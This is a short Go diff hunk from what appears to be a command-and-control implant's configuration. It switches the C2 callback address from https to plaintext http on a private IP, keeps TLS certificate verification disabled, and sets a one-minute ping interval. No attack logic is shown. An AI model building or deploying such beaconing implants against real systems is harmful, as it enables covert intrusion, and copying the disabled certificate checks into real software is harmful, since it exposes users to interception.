@@ -7,7 +7,7 @@ import (
 )
 
 var (
-	C2                      = [...]string{"https://10.37.129.2:8080/"}
+	C2                      = [...]string{"http://10.37.129.2:8080/"}
 	InsecureSkipVerify bool = true
 
 	PingTime  int    = 1 //minutes
